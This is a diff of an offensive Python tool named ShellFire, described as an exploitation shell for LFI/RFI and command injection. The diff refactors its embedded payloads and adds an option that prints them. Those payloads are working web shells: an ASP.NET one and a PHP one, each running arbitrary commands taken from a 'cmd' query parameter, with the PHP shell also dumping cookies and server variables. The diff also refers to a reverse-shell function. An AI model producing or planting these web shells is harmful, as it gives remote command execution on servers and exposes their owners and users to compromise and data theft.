@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/bin/env python3
 # Thanks to Offensive-Security for inspiring this!
 # Written by Unix-Ninja
 # Aug 2016
@@ -19,7 +19,7 @@ import time
 ############################################################
 ## Configs
 
-version = "0.6"
+version = "0.7"
 url = "http://www.example.com?"
 history_file = os.path.abspath(os.path.expanduser("~/.shellfire_history"))
 post_data = {}
@@ -34,6 +34,9 @@ auth_pass = None
 payload = ""
 payload_type = "PHP"
 cmd_encode = None
+marker = "--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--"
+
+http_running = False
 
 ############################################################
 ## Payloads
@@ -41,8 +44,8 @@ cmd_encode = None
 def payload_aspnet():
   global payload
   global payload_type
-  payload = """\
---9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--<%
+  payload = f"""\
+{marker}<%
 Dim objShell = Server.CreateObject("WSCRIPT.SHELL")
 Dim command = Request.QueryString("cmd")
 
@@ -50,29 +53,29 @@ Dim comspec = objShell.ExpandEnvironmentStrings("%comspec%")
 
 Dim objExec = objShell.Exec(comspec & " /c " & command)
 Dim output = objExec.StdOut.ReadAll()
-%><%= output %>--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--
+%><%= output %>{marker}
 """
   payload_type = "ASP.NET"
 
 def payload_php():
   global payload
   global payload_type
-  payload = """\
---9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--<?php
-if ($_GET['cmd'] == '_show_phpinfo') {
+  payload = f"""\
+{marker}<?php
+if ($_GET['cmd'] == '_show_phpinfo') {{
   phpinfo();
-} else if ($_GET['cmd'] == '_show_cookie') {
+}} else if ($_GET['cmd'] == '_show_cookie') {{
   var_dump($_COOKIE);
-} else if ($_GET['cmd'] == '_show_get') {
+}} else if ($_GET['cmd'] == '_show_get') {{
   var_dump($_GET);
-} else if ($_GET['cmd'] == '_show_post') {
+}} else if ($_GET['cmd'] == '_show_post') {{
   var_dump($_POST);
-} else if ($_GET['cmd'] == '_show_server') {
+}} else if ($_GET['cmd'] == '_show_server') {{
   var_dump($_SERVER);
-} else {
-  system($_GET['cmd']) || print `{$_GET['cmd']}`;
-}
-?>--9453901401ed3551bc94fcedde066e5fa5b81b7ff878c18c957655206fd538da--
+}} else {{
+  system($_GET['cmd']) || print `{{$_GET['cmd']}}`;
+}}
+?>{marker}
 """
   payload_type = "PHP"
 
@@ -213,11 +216,36 @@ def rev_shell(addr, port):
 
 parser = argparse.ArgumentParser(description='Exploitation shell for LFI/RFI and command injection')
 parser.add_argument('-d', dest='debug', action='store_true', help='enable debugging (show queries during execution)')
+parser.add_argument('--generate', dest='payload', help='generate a payload to stdout. PAYLOAD can be "php" or "aspnet".')
 args = parser.parse_args()
 
 ############################################################
 ## Main App
 
+## if we are generating a payload to stdout, do it now, then bail
+if args.payload:
+  args.payload = args.payload.lower()
+  if args.payload == "php":
+    sys.stderr.write("[*] Generating PHP payload...\n")
+    payload_php()
+  elif args.payload == "aspnet":
+    sys.stderr.write("[*] Generating ASP.NET payload...\n")
+    payload_aspnet()
+  else:
+    sys.stderr.write("[*] Invalid payload!\n")
+  sys.stdout.write(payload)
+  sys.exit(1)
+
+## show our banner
+sys.stdout.write(""" (                                            
+ )\ )    )       (   (   (                    
+(()/( ( /(    (  )\  )\  )\ )  (   (      (   
+ /(_)))\())  ))\((_)((_)(()/(  )\  )(    ))\  
+(_)) ((_)\  /((_)_   _   /(_))((_)(()\  /((_) 
+/ __|| |(_)(_)) | | | | (_) _| (_) ((_)(_))   
+\__ \| ' \ / -_)| | | |  |  _| | || '_|/ -_)  
+|___/|_||_|\___||_| |_|  |_|   |_||_|  \___|
+""")
 sys.stdout.write("[*] ShellFire v" + version + "\n")
 sys.stdout.write("[*] Type '.help' to see available commands\n")
 if args.debug == True:
@@ -225,8 +253,8 @@ if args.debug == True:
 
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-global http_running
-http_running = False
+#global http_running
+#http_running = False
 
 global revshell_running
 revshell_running = False
